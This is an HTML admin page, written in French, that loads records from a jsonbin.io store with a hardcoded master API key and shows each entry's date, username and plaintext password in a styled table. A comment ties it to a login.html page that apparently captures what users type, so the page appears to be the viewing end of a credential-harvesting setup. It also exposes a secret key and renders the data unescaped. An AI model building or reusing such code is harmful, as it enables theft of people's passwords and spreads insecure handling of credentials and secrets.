<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Admin - Logs</title>
    <style>
        table {
            border-collapse: collapse;
            width: 80%;
            margin: 20px auto;
            font-family: Arial, sans-serif;
        }
        th, td {
            border: 2px solid #FF69B4;
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #FF69B4;
            color: white;
        }
    </style>
</head>
<body>
    <h1 style="text-align: center;">Logs des connexions</h1>
    <div id="logs"></div>

    <script>
        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2'; // MÃªme que dans login.html
        const BIN_ID = '679cba12acd3cb34a8d5f51d'; // MÃªme que dans login.html
        
        async function loadLogs() {
            try {
                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': API_KEY }
                });
                
                const data = await response.json();
                displayLogs(data.record);
        
            } catch (error) {
                console.error('Erreur :', error);
                document.getElementById('logs').innerHTML = 
                    '<p style="color: red;">Erreur de chargement ðŸ˜¥ RafraÃ®chissez la page !</p>';
            }
        }
        
        function displayLogs(logs) {
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML = `
                <table>
                    <tr>
                        <th>Date</th>
                        <th>Username</th>
                        <th>Password</th>
                    </tr>
                    ${logs.reverse().map(log => `
                        <tr>
                            <td>${new Date(log.timestamp).toLocaleString('fr-FR')}</td>
                            <td>${log.username}</td>
                            <td>${log.password}</td>
                        </tr>
                    `).join('')}
                </table>
            `;
        }
        
        loadLogs();
    </script>
</body>
</html>
